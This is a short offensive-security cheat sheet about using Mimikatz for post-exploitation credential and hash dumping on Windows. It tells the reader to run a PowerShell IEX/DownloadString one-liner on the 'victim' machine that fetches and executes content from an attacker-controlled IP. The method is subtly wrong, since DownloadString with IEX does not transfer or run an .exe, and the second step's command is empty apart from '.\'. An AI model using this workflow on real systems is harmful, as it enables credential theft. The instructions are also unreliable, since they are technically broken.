---
description: >-
  Mimikatz is used in post-exploitation on Windows machine to dump hashes and
  credential information from memory.
---

# Mimikatz

## Information:

* System or Admin privileges are required. Use once sys/admin creds have been obtained.
* Used to extract Windows creds/hashes from memory during post-exploitation.

***

## Method:

1. Transfer the Mimikatz.exe executable onto the victim machine first. You can do this by opening a HTTP server on your machine using Python. In a PowerShell session on the victim, run this command:

```powershell
> powershell -Command "IEX(New-Object Net.WebClient).DownloadString('http://[Attacker IP]:[Port for Web Server]/[File Path to mimikatz.exe]')"
```

2. Run Mimikatz.exe on the victim machine:

```
.\
```
